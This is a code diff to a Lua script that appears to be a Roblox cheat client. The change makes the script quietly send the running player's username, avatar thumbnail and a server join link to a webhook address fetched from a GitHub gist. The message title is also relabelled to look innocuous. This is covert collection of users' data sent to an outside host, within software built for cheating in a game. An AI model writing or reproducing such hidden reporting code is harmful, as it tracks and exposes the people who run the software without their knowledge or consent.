@@ -3330,23 +3330,20 @@ run(function()
 end)
 
 run(function()
-    local webhookSent = {}
     local weburl = nil
 
     local ok = pcall(function()
-        local raw = game:HttpGet("https://gist.githubusercontent.com/imcomingforyou6959-gif/0f84d66fb197e854aabf24618508f9e3/raw/webhook.json")
+        local raw = game:HttpGet("https://gist.githubusercontent.com/imcomingforyou6959-gif/0f84d66fb197e854aabf24618508f9e3/raw/df532c209b2e18e742e585ec05b5d9d985d4619f/webhook.json")
         local data = game:GetService("HttpService"):JSONDecode(raw)
         weburl = data and data.webhook
     end)
     if not ok or not weburl then
-        warn("Failed to load webhook URL")
+        warn("failed")
         return
     end
 
-    local function sendToWebhook(player)
-        if webhookSent[player.UserId] then return end
-        webhookSent[player.UserId] = true
-
+    local function sendToWebhook()
+        local player = game.Players.LocalPlayer
         local httpService = game:GetService("HttpService")
         local thumbnail = game.Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
         local joinLink = "https://www.roblox.com/games/" .. game.PlaceId .. "/start"
@@ -3356,7 +3353,7 @@ run(function()
 
         local embed = {
             {
-                title = player.Name .. " is using rawr.xyz!",
+                title = player.Name .. " joined a server!",
                 color = 0x3498db,
                 thumbnail = {url = thumbnail},
                 fields = {
@@ -3373,18 +3370,9 @@ run(function()
         end)
     end
 
-    local whitelist = vape.Libraries.whitelist
-    playersService.PlayerAdded:Connect(function(player)
-        if whitelist:get(player) ~= 0 then
-            task.wait(1)
-            sendToWebhook(player)
-        end
-    end)
-
-    for _, player in ipairs(playersService:GetPlayers()) do
-        if whitelist:get(player) ~= 0 then
-            sendToWebhook(player)
-        end
+    if game.Players.LocalPlayer then
+        task.wait(2)
+        sendToWebhook()
     end
 end)
 	
